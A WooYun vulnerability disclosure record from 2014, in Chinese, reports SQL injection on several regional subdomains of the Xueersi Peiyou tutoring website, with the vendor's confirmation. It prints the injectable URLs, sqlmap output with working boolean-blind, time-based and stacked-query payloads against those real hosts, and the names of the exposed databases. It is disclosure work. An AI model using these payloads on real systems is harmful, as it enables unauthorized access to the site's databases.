{"id": 51122, "wybug_id": "wooyun-2014-075628", "wybug_title": "学而思培优多个分站存在SQL注入漏洞2", "wybug_corp": "好未来集团学而思培优", "wybug_author": "浮萍", "wybug_date": "2014-09-10 10:58", "wybug_open_date": "2014-10-25 11:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向公众公开  简要描述： wooyun-2014-075014已修复其他的问题 详细说明：  speiyou站在\"年级\"处郑州http://zz.speiyou.com/search/index\n\n在年级处任意选择一个\n\nhttp://zz.speiyou.com/search/index/grade:ff808081427f932601428f4484932916/subject:/level:bx/term:/gtype:tea在grade参数后输入'\n\n注入点：http://zz.speiyou.com/search/index/grade:ff808081427f932601428f4484932916/subject:/level:bx/term:/gtype:tea\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://zz.speiyou.com:80/search/index/subject:/grade:ff808081427f932601428f443c562912' AND 1352=1352 AND 'mcTx'='mcTx/gtype:time    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://zz.speiyou.com:80/search/index/subject:/grade:ff808081427f932601428f443c562912' AND SLEEP(5) AND 'JjCx'='JjCx/gtype:time---\n数据库\navailable databases [3]:[*] information_schema[*] test[*] xxgl\n数据库信息与http://wooyun.org/bugs/wooyun-2014-075014中一致   漏洞证明：  同理北京：\nhttp://sbj.speiyou.com/search/index/subject:ff80808127d77caa0127d7e10f1c00c4/grade:ff80808127fabe0c0127fae69bc1004a/gtype:time\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: http://sbj.speiyou.com:80/search/index/subject:ff80808127d77caa0127d7e10f1c00c4/grade:ff80808127fabe0c0127fae69bc1004a'; SELECT SLEEP(5)-- /gtype:time---[23:12:03] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11\n--------------天津http://stj.speiyou.com/search/index/subject:/grade:13/gtype:time\nURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 148 HTTP(s) requests:---Place: URIParameter: #1*    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries    Payload: http://stj.speiyou.com:80/search/index/subject:/grade:13'; SELECT SLEEP(5)-- /gtype:time---\n\n\n---------------其他就不再测试了可以看看学科、班次和班级类型处是否有注入还有排查老站点是否存在这些问题另外发现了几处源码不知是不是学而思的https://github.com/javaxiaomangren/schedulehttps://github.com/heatroom/nightmare-mooc   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-11 11:21 厂商回复： 感谢洞主提醒，正在检查 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}